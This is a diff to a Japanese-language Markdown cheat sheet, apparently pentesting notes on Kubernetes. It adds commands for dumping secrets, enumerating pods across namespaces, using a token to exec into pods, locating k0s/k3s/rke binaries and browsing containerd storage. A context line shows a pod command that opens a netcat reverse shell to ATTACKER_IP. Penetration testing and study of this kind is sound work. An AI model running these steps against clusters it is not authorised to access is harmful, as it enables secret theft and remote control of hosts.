@@ -14,6 +14,11 @@ secrets をgetできる場合
 
 ```sh
 kubectl get secrets
+
+kubectl get secrets <secret-name>
+
+# -o yaml を付けないと表示されない内容がある
+kubectl get secrets <secret-name> -o yaml
 ```
 
 ```sh
@@ -22,6 +27,28 @@ kubectl describe secret
 
 ```sh
 kubectl exec -it <pod-name> --token=${TOKEN} -- /bin/bash
+```
+
+```sh
+kubectl get pods
+
+# デフォルト名前空間以外も出てくる
+kubectl get pods -A
+
+# ボリュームなども表示される
+kubectl get pods -A -o yaml
+```
+
+ジョブ
+
+```sh
+kubectl get job -n <namespace> -o json
+```
+
+ログ
+
+```sh
+kubectl logs <pod> -n <namespace>
 ```
 
 ## すべてを許可する設定のPod設定
@@ -181,10 +208,55 @@ curl による REST API の直叩きではExecを実行できないが、コマ�
 "command": ["/bin/sh", "-c", "nc ATTACKER_IP 4444 -e /bin/sh"]
 ```
 
-## microk8s
+## 使えるバイナリ
+
+### microk8s
 
 下記の形でコマンドを実行する
 
 ```sh
 microk8s kubectl ...
+```
+
+### k0s系
+
+- k0s
+- k0sctl
+
+### k3s / RKE 系
+
+- k3s
+- rke2
+
+### Canonical / Rancher 系
+
+- rancher
+- fleet
+
+### 検索例
+
+```sh
+find / -maxdepth 4 -type f \( -name 'k0s*' -o -name 'k3s*' -o -name 'rke*' \) 2>/dev/null
+```
+
+## ファイルシステム
+
+### pods
+
+```sh
+ls -al /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/
+```
+
+### kubelet管理領域
+
+```sh
+ls -al /var/lib/kubelet/pods/
+```
+
+### k0s, k3s
+
+```sh
+ls -la /var/lib/k0s/containerd/
+
+ls -al /var/lib/rancher/k3s/agent/containerd/
 ```
